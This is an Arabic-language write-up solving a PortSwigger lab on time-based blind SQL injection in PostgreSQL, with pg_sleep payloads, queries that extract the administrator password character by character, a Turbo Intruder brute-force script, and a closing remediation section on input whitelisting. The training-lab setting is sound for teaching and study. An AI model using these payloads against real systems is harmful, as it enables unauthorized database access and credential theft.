# [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

## **`الهدف`**
قم بتنفيذ هجوم `Blind SQLi` لمعرفة كلمة مرور حساب `administrator` ثم قم بتسجيل الدخول إليه.
## **`خطوات الحل`**
==**`ملاحظة:`**== البورتسويجر يستعمل في هذ اللاب قاعدة بيانات من نوع `PostgreSQL`.
==**`ملاحظة:`==** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

سنقوم بتكرار نفس خطوات حل [اللاب السابق](./Blind-SQL-injection-with-conditional-responses.md) ولكن سنقوم باستعمال أمر استعلام مختلف لاختبار وجودة ثغرة `SQLi`
```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END--
أو
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
'||(SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

==**`ملاحظة جانبية:`**== يمكن استعمال إحدى الإستعلامات التالية لتحديد الطول الدقيق لكلمة المرور قبل بدأ التخمين، ولكنها خطوة إختيارية إلى حد ما.
```sql
'; SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username = 'administrator') > 1 THEN pg_sleep(3) ELSE pg_sleep(0) END--

'; SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username = 'administrator') > 2 THEN pg_sleep(3) ELSE pg_sleep(0) END--

أو

'||(SELECT CASE WHEN (LENGTH(password) > 1) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')--

'||(SELECT CASE WHEN (LENGTH(password) > 2) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')--

```

ثم سنقوم بحقن إحدى أوامر الإستعلام التالية في الـ `TrackingId` داخل `Inspector` لسحب كلمة مرور حساب `administrator`.
```sql
'; SELECT CASE WHEN (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) = 'm') = 1 THEN pg_sleep(2) ELSE pg_sleep(0) END--

أو

'||(SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'm') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

ثم سنقوم بتحويل الطلب إلى `Turbo Intruder` ونستعمل هذا السكريبت الذي يقوم بطباعة جميع الطلبات،
وسنعتمد على خانة/حقل `(TTFB)` في واجهة `UI` الخاصة بـ `Turbo Intruder` حيثم سنقوم بالضغط على هذا الحقل ليتم ترتيب الطلبات تصاعديًا/تنازليًا حسب المدة المستغرقة وسنجد المدة مكتوبة بصيغة مكونة من `7` أرقام وبما أننا حددنا المدة بثانيتين فقط فأى طلب يوجد في حقل `TTFB` بجانبه مدة أكبر من `2000000` فهذا يعنى أنه حرف صحيح.
```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=20,
                           pipeline=False)

    # Define characters to loop through
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    # Loop through positions and characters natively
    for position in range(1, 25):
        for char in chars:
            # Pass both variables directly to the engine to replace the placeholders
            engine.queue(target.req, [str(position), char])

def handleResponse(req, interesting):
        table.add(req)
```
ثم سنقوم بتجميع الحروف من الاستجابات بالترتيب حتى نحصل على كلمة المرور كاملة `5jm2chs5xbrtepvsr8ob`، ثم نقوم بتسجيل الدخول إلى حساب `administrator` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)

ولكن بتعديل بسيط في النقطة الثانية من الترقيع حيث ستصبح:  
ويجب التحقق من مدخلات المستخدم ومطابقتها مع قائمة بيضاء محددة مسبقا قبل تمريرها إلى قاعدة البيانات، وبما أن قيمة الـ `TrackingId` داخل الـ `Cookie` تكون معروفة الهيكلة وتتكون فقط من حروف وأرقام `Alphanumeric` وبطول ثابت، فيجب ألا يتم قبول أي مدخل يخرج عن هذا النطاق مثل احتوائه على علامات اقتباس أو رموز خاصة أو بطول أكبر من المُحدد، ويقوم التطبيق برفض الطلب فوراً إذا كان المدخل غير صالح.
